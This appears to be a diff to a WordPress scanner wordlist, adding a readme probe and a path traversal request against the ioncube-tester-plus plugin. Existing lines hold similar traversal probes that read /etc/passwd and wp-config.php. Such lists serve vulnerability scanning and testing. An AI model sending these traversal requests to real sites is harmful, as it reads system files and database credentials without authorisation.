@@ -488,3 +488,5 @@
 /wp-content/themes/the-wound/force_download.php?file=../../../wp-config.php
 /wp-content/themes/the-wound/force_download.php?file=/etc/passwd
 /wp-content/plugins/eventon-lite/readme.txt
+/wp-content/plugins/ioncube-tester-plus/readme.txt
+/wp-content/plugins/ioncube-tester-plus/loader-wizard.php?page=phpconfig&download=1&ininame=../../../../../../../../etc/passwd
